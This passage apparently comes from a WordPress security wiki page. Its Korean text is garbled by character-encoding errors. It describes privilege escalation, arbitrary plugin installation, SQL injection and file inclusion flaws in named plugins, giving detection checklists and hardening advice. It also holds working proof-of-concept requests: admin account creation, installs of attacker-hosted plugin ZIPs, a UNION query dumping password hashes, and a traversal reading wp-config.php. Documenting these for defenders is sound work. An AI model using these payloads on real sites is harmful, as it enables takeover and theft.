- í´ë¼ì´ì–¸íŠ¸ ì…ë ¥ì—ì„œ ì‹ ì›ì„ ìœ ì¶”í•˜ì§€ ë§ˆì„¸ìš”. ê²€ì¦ëœ provider token/IDì—ì„œ ìœ ë˜í•œ ì´ë©”ì¼/IDë§Œ í—ˆìš©í•˜ì„¸ìš”.
- ë¡œê·¸ì¸ ë³´ì¡° ê¸°ëŠ¥ì—ë„ CSRF noncesì™€ capability ì²´í¬ë¥¼ ìš”êµ¬í•˜ì„¸ìš”; í•„ìš”í•˜ì§€ ì•Šë‹¤ë©´ wp_ajax_nopriv_ ë“±ë¡ì„ í”¼í•˜ì„¸ìš”.
- OAuth/OIDC ì‘ë‹µì„ ì„œë²„ ì¸¡ì—ì„œ ê²€ì¦í•˜ì„¸ìš”; ëˆ„ë½ë˜ê±°ë‚˜ ìœ íš¨í•˜ì§€ ì•Šì€ providerëŠ” ê±°ë¶€í•˜ì„¸ìš”(POST idë¡œ í´ë°±í•˜ì§€ ë§ˆì„¸ìš”).
- ìˆ˜ì •ë  ë•Œê¹Œì§€ social loginì„ ì¼ì‹œì ìœ¼ë¡œ ë¹„í™œì„±í™”í•˜ê±°ë‚˜ ì—£ì§€ì—ì„œ ì·¨ì•½í•œ actionì„ ì°¨ë‹¨í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ê°€ìƒ íŒ¨ì¹˜ ì ìš©ì„ ê³ ë ¤í•˜ì„¸ìš”.

Patched behaviour (Jobmonster 4.8.0)

- $_POST['id']ì˜ ë¶ˆì•ˆì „í•œ í´ë°±ì„ ì œê±°í•¨; $user_emailì€ switch($_POST['using'])ì˜ ê²€ì¦ëœ provider ë¶„ê¸°ì—ì„œ ìœ ë˜í•´ì•¼ í•¨.

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ í˜¸ì¶œìì˜ ê¶Œí•œì„ ê²€ì¦í•˜ì§€ ì•Šê³  ì¬ì‚¬ìš© ê°€ëŠ¥í•œ â€œconnection keysâ€ ë˜ëŠ” í† í°ì„ ë°œê¸‰(mint)í•˜ëŠ” REST ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤. ë¼ìš°íŠ¸ê°€ ì¶”ì¸¡ ê°€ëŠ¥í•œ ì†ì„±(e.g., username)ë§Œìœ¼ë¡œ ì¸ì¦í•˜ê³  í‚¤ë¥¼ ê¶Œí•œ ì²´í¬ê°€ ìˆëŠ” ì‚¬ìš©ì/ì„¸ì…˜ì— ë°”ì¸ë”©í•˜ì§€ ì•Šìœ¼ë©´, ì¸ì¦ë˜ì§€ ì•Šì€ ê³µê²©ìê°€ í‚¤ë¥¼ ë°œê¸‰ë°›ì•„ ê¶Œí•œì´ í•„ìš”í•œ ë™ì‘(admin ê³„ì • ìƒì„±, plugin ë™ì‘ â†’ RCE)ì„ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Why itâ€™s exploitable
- ë¯¼ê°í•œ REST ê²½ë¡œê°€ ë‚®ì€ ì—”íŠ¸ë¡œí”¼ì˜ ì‹ ì› ì¦ëª… (username) ë§Œìœ¼ë¡œ ë³´í˜¸ë˜ê±°ë‚˜ permission_callbackì´ ëˆ„ë½ë˜ì–´ ìˆìŒ
- capability ê²€ì¦ì´ ì—†ì–´ ë°œê¸‰ëœ í‚¤ê°€ ë²”ìš© ìš°íšŒë¡œë¡œ ë°›ì•„ë“¤ì—¬ì§

Detection checklist
- Grep plugin code for register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- ìš”ì²­ìœ¼ë¡œ ì œê³µëœ ì‹ ì›(username/email)ì— ê¸°ë°˜í•´ tokens/keysë¥¼ ë°œê¸‰í•˜ì§€ë§Œ ì¸ì¦ëœ ì‚¬ìš©ìë‚˜ capabilityì— ë¬¶ì§€ ì•ŠëŠ” ëª¨ë“  ê²½ë¡œ
- ì„œë²„ ì¸¡ capability ê²€ì¦ ì—†ì´ ë°œê¸‰ëœ token/keyë¥¼ ë°›ì•„ë“¤ì´ëŠ” í›„ì† ê²½ë¡œë¥¼ ì°¾ì•„ë¼

Hardening
- ê¶Œí•œì´ í•„ìš”í•œ REST ê²½ë¡œì—ëŠ” í•´ë‹¹ capabilityì— ëŒ€í•´ current_user_can()ì„ ê°•ì œí•˜ëŠ” permission_callbackì„ ìš”êµ¬í•˜ë¼
- í´ë¼ì´ì–¸íŠ¸ê°€ ì œê³µí•œ ì‹ ì›ìœ¼ë¡œ ì¥ê¸° ìœ íš¨ í‚¤ë¥¼ ë°œê¸‰í•˜ì§€ ë§ ê²ƒ; í•„ìš”í•˜ë©´ ì¸ì¦ í›„ ë‹¨ê¸°, ì‚¬ìš©ì ë°”ì¸ë“œëœ í† í°ì„ ë°œê¸‰í•˜ê³  ì‚¬ìš© ì‹œ capabilityë¥¼ ì¬ê²€ì¦í•˜ë¼
- í˜¸ì¶œìì˜ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ê²€ì¦í•˜ë¼ (wp_set_current_userëŠ” ë‹¨ë…ìœ¼ë¡œ ì¶©ë¶„í•˜ì§€ ì•ŠìŒ) ë° !is_user_logged_in() || !current_user_can(<cap>) ì¸ ê²½ìš° ìš”ì²­ì„ ê±°ë¶€í•˜ë¼

---

## Nonce gate misuse â†’ unauthenticated arbitrary plugin installation (FunnelKit Automations â‰¤ 3.5.3)

NoncesëŠ” CSRFë¥¼ ë°©ì§€í•  ë¿ ê¶Œí•œ ë¶€ì—¬(authorization)ë¥¼ ëŒ€ì‹ í•˜ì§€ ëª»í•œë‹¤. ì½”ë“œê°€ nonce í†µê³¼ë¥¼ í—ˆê°€ ì‹ í˜¸ë¡œ ë³´ê³  install/activate plugins ê°™ì€ ê¶Œí•œ ì‘ì—…ì—ì„œ capability ê²€ì‚¬ë¥¼ ê±´ë„ˆë›´ë‹¤ë©´, ì¸ì¦ë˜ì§€ ì•Šì€ ê³µê²©ìëŠ” ì•½í•œ nonce ìš”êµ¬ì‚¬í•­ì„ ì¶©ì¡±ì‹œì¼œ ë°±ë„ì–´ê°€ ì‹¬ê¸´ ë˜ëŠ” ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•¨ìœ¼ë¡œì¨ RCEì— ë„ë‹¬í•  ìˆ˜ ìˆë‹¤.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- í•­ìƒ noncesë¥¼ CSRF í† í°ìœ¼ë¡œë§Œ ì·¨ê¸‰í•˜ì„¸ìš”; nonce ìƒíƒœì™€ ê´€ê³„ì—†ì´ ê¶Œí•œ ê²€ì‚¬ë¥¼ ê°•ì œí•˜ì„¸ìš”
- installer codeì— ë„ë‹¬í•˜ê¸° ì „ì— current_user_can('install_plugins') ë° current_user_can('activate_plugins')ë¥¼ ìš”êµ¬í•˜ì„¸ìš”
- ì¸ì¦ë˜ì§€ ì•Šì€ ì ‘ê·¼ì„ ê±°ë¶€í•˜ì„¸ìš”; ê¶Œí•œì´ í•„ìš”í•œ íë¦„ì— ëŒ€í•´ nopriv AJAX actionsë¥¼ ë…¸ì¶œí•˜ì§€ ë§ˆì„¸ìš”

### Subscriber+ AJAX plugin installer â†’ forced malicious activation (Motors Theme â‰¤ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)ê°€ Motors themeì´ ë™ë°˜ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•˜ê¸° ìœ„í•œ ì¸ì¦ëœ AJAX í—¬í¼ë¥¼ ì œê³µí•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì£¼ì—ˆìŠµë‹ˆë‹¤:
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- ì˜¤ì§ `check_ajax_referer()`ë§Œ í˜¸ì¶œë˜ë©°; `current_user_can('install_plugins')`ë‚˜ `current_user_can('activate_plugins')`ëŠ” ì—†ë‹¤.
- í•´ë‹¹ nonceëŠ” Motors ê´€ë¦¬ì í˜ì´ì§€ì— í¬í•¨ë˜ì–´ ìˆì–´, `/wp-admin/`ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ëª¨ë“  SubscriberëŠ” HTML/JSì—ì„œ ì´ë¥¼ ë³µì‚¬í•  ìˆ˜ ìˆë‹¤.
- í•¸ë“¤ëŸ¬ëŠ” ê³µê²©ìê°€ ì œì–´í•˜ëŠ” `plugin` íŒŒë¼ë¯¸í„°(`$_GET`ì—ì„œ ì½ìŒ)ë¥¼ ì‹ ë¢°í•˜ì—¬ `Plugin_Upgrader::install()`ì— ì „ë‹¬í•˜ë¯€ë¡œ, ì„ì˜ì˜ ì›ê²© ZIPì´ `wp-content/plugins/`ë¡œ ë‹¤ìš´ë¡œë“œëœë‹¤.
- ì„¤ì¹˜ í›„ í…Œë§ˆëŠ” ì¡°ê±´ ì—†ì´ `mvl_theme_activate_plugin()`ë¥¼ í˜¸ì¶œí•˜ì—¬ ê³µê²©ì í”ŒëŸ¬ê·¸ì¸ì˜ PHP ì½”ë“œ ì‹¤í–‰ì„ ë³´ì¥í•œë‹¤.

#### Exploitation flow

1. ì €ê¶Œí•œ ê³„ì •(Subscriberë©´ ì¶©ë¶„í•¨)ì„ ë“±ë¡í•˜ê±°ë‚˜ íƒˆì·¨í•˜ê³  Motors ëŒ€ì‹œë³´ë“œ UIì—ì„œ `mvl_theme_install_base` nonceë¥¼ íšë“í•œë‹¤.
2. ìµœìƒìœ„ ë””ë ‰í† ë¦¬ê°€ ì˜ˆìƒë˜ëŠ” ìŠ¬ëŸ¬ê·¸ `motors-car-dealership-classified-listings/`ì™€ ì¼ì¹˜í•˜ëŠ” plugin ZIPì„ ë§Œë“¤ê³ , `*.php` ì§„ì…ì ì— backdoor ë˜ëŠ” webshellì„ í¬í•¨ì‹œí‚¨ë‹¤.
3. ZIPì„ í˜¸ìŠ¤íŠ¸í•˜ê³  í•¸ë“¤ëŸ¬ë¥¼ ë‹¹ì‹ ì˜ URLë¡œ ì§€ì •í•˜ì—¬ ì„¤ì¹˜ í”„ë¡œê·¸ë¨ì„ íŠ¸ë¦¬ê±°í•œë‹¤:
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
í•¸ë“¤ëŸ¬ê°€ `$_GET['plugin']`ì„ ì½ê¸° ë•Œë¬¸ì— ë™ì¼í•œ í˜ì´ë¡œë“œëŠ” ì¿¼ë¦¬ ë¬¸ìì—´ì„ í†µí•´ì„œë„ ì „ì†¡ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

- í…Œë§ˆ/í”ŒëŸ¬ê·¸ì¸ì—ì„œ `Plugin_Upgrader`, `Theme_Upgrader`, ë˜ëŠ” `install_plugin.php` ì»¤ìŠ¤í…€ í—¬í¼ê°€ `wp_ajax_*` í›…ì— capability ê²€ì‚¬ ì—†ì´ ì—°ê²°ë˜ì–´ ìˆëŠ”ì§€ ê²€ìƒ‰í•˜ì„¸ìš”.
- `plugin`, `package`, `source`, ë˜ëŠ” `url` íŒŒë¼ë¯¸í„°ë¥¼ ë°›ì•„ upgrader APIë¡œ ì „ë‹¬í•˜ëŠ” í•¸ë“¤ëŸ¬ë¥¼ ê²€ì‚¬í•˜ì„¸ìš”. íŠ¹íˆ ìŠ¬ëŸ¬ê·¸ê°€ í•˜ë“œì½”ë”©ë˜ì–´ ìˆê³  ZIP ë‚´ìš©ì´ ê²€ì¦ë˜ì§€ ì•ŠëŠ” ê²½ìš° ì£¼ì˜í•˜ì„¸ìš”.
- ì¸ìŠ¤í†¨ëŸ¬ ë™ì‘ì— ëŒ€í•œ nonceë¥¼ ë…¸ì¶œí•˜ëŠ” ê´€ë¦¬ì í˜ì´ì§€ë¥¼ ê²€í† í•˜ì„¸ìš”â€”Subscribersê°€ í˜ì´ì§€ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆë‹¤ë©´ nonceê°€ leakëœ ê²ƒìœ¼ë¡œ ê°€ì •í•˜ì„¸ìš”.

#### ê°•í™”

- nonce ê²€ì¦ í›„ ì¸ìŠ¤í†¨ëŸ¬ AJAX ì½œë°±ì— ëŒ€í•´ `current_user_can('install_plugins')` ë° `current_user_can('activate_plugins')` ê¶Œí•œ ê²€ì‚¬ë¥¼ ì ìš©í•˜ì„¸ìš”; Motors 5.6.82ê°€ ì´ ë²„ê·¸ë¥¼ íŒ¨ì¹˜í•˜ê¸° ìœ„í•´ ì´ ê²€ì‚¬ë¥¼ ë„ì…í–ˆìŠµë‹ˆë‹¤.
- ì‹ ë¢°ë˜ì§€ ì•Šì€ URLì„ ê±°ë¶€í•˜ì„¸ìš”: ì¸ìŠ¤í†¨ëŸ¬ë¥¼ ë²ˆë“¤ëœ ZIPì´ë‚˜ ì‹ ë¢°ëœ ë¦¬í¬ì§€í† ë¦¬ë¡œ ì œí•œí•˜ê±°ë‚˜ ì„œëª…ëœ ë‹¤ìš´ë¡œë“œ ë§¤ë‹ˆí˜ìŠ¤íŠ¸ë¥¼ ê°•ì œí•˜ì„¸ìš”.
- nonceë¥¼ ì—„ê²©íˆ CSRF í† í°ìœ¼ë¡œ ì·¨ê¸‰í•˜ì„¸ìš”; nonceëŠ” ê¶Œí•œì„ ì œê³µí•˜ì§€ ì•Šìœ¼ë©° capability ê²€ì‚¬ë¥¼ ëŒ€ì²´í•´ì„œëŠ” ì•ˆ ë©ë‹ˆë‹¤.

---

## depicter-* ì•¡ì…˜ì˜ s ê²€ìƒ‰ íŒŒë¼ë¯¸í„°ë¥¼ í†µí•œ ì¸ì¦ë˜ì§€ ì•Šì€ SQLi (Depicter Slider â‰¤ 3.6.1)

ì—¬ëŸ¬ depicter-* ì•¡ì…˜ì´ s (search) íŒŒë¼ë¯¸í„°ë¥¼ ë°›ì•„ SQL ì¿¼ë¦¬ì— íŒŒë¼ë¯¸í„°í™” ì—†ì´ ë¬¸ìì—´ì„ ì´ì–´ë¶™ì˜€ìŠµë‹ˆë‹¤.

- íŒŒë¼ë¯¸í„°: s (search)
- ê²°í•¨: WHERE/LIKE ì ˆì—ì„œ ì§ì ‘ ë¬¸ìì—´ ì—°ê²°; prepared statements/ì…ë ¥ ì •í™” ì—†ìŒ
- ì˜í–¥: ë°ì´í„°ë² ì´ìŠ¤ ìœ ì¶œ(ì‚¬ìš©ì, í•´ì‹œ), ìˆ˜í‰ ì´ë™

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸
- depicter-* ì•¡ì…˜ í•¸ë“¤ëŸ¬ì™€ SQLì—ì„œ $_GET['s'] ë˜ëŠ” $_POST['s']ì˜ ì§ì ‘ ì‚¬ìš©ì„ grepìœ¼ë¡œ ê²€ìƒ‰
- së¥¼ ì—°ê²°í•˜ì—¬ $wpdb->get_results()/query()ì— ì „ë‹¬ë˜ëŠ” ì»¤ìŠ¤í…€ ì¿¼ë¦¬ë¥¼ ê²€í† 

ê°•í™”
- í•­ìƒ $wpdb->prepare() ë˜ëŠ” wpdb placeholdersë¥¼ ì‚¬ìš©; ì„œë²„ ì¸¡ì—ì„œ ì˜ˆê¸°ì¹˜ ì•Šì€ ë©”íƒ€ë¬¸ìë¥¼ ê±°ë¶€
- sì— ëŒ€í•´ ì—„ê²©í•œ í—ˆìš© ëª©ë¡ì„ ì¶”ê°€í•˜ê³  ì˜ˆìƒ ë¬¸ìì…‹/ê¸¸ì´ë¡œ ì •ê·œí™”

---

## ì¸ì¦ë˜ì§€ ì•Šì€ Local File Inclusion (ê²€ì¦ë˜ì§€ ì•Šì€ template/file ê²½ë¡œë¥¼ í†µí•œ) (Kubio AI Page Builder â‰¤ 2.5.1)

í…œí”Œë¦¿ íŒŒë¼ë¯¸í„°ì—ì„œ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ê²½ë¡œë¥¼ ì •ê·œí™”/ê²©ë¦¬ ì—†ì´ í—ˆìš©í•˜ë©´ ì„ì˜ì˜ ë¡œì»¬ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìœ¼ë©°, í¬í•¨ ê°€ëŠ¥í•œ PHP/ë¡œê·¸ íŒŒì¼ì´ ëŸ°íƒ€ì„ì— í¬í•¨ë˜ë©´ ë•Œë•Œë¡œ ì½”ë“œ ì‹¤í–‰(RCE)ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: ì •ê·œí™”/í—ˆìš© ëª©ë¡ ì—†ìŒ; ë””ë ‰í„°ë¦¬ íŠ¸ë˜ë²„ì„¤ í—ˆìš©
- Impact: ë¹„ë°€ ë…¸ì¶œ (wp-config.php), íŠ¹ì • í™˜ê²½ì—ì„œ ì ì¬ì  RCE (log poisoning, includable PHP)

PoC â€“ wp-config.php ì½ê¸°
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸
- realpath() ê²€ì¦ ì—†ì´ ìš”ì²­ ê²½ë¡œë¥¼ include()/require()/read sinksì— ì—°ê²°(concatenate)í•˜ëŠ” ëª¨ë“  í•¸ë“¤ëŸ¬
- ì˜ë„ëœ templates ë””ë ‰í„°ë¦¬ ë°–ìœ¼ë¡œ ë²—ì–´ë‚˜ëŠ” traversal íŒ¨í„´ (../) ì°¾ê¸°

ë³´ì•ˆ ê°•í™”
- í—ˆìš© ëª©ë¡ì— ìˆëŠ” í…œí”Œë¦¿ ê°•ì œ ì ìš©; realpath()ë¡œ ê²½ë¡œë¥¼ í•´ì„í•˜ê³  require str_starts_with(realpath(file), realpath(allowed_base))
- ì…ë ¥ ì •ê·œí™”; traversal ì‹œí€€ìŠ¤ì™€ ì ˆëŒ€ ê²½ë¡œëŠ” ê±°ë¶€; sanitize_file_name()ì€ íŒŒì¼ëª…ì—ë§Œ ì‚¬ìš©(ì „ì²´ ê²½ë¡œì—ëŠ” ì‚¬ìš©í•˜ì§€ ì•ŠìŒ)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
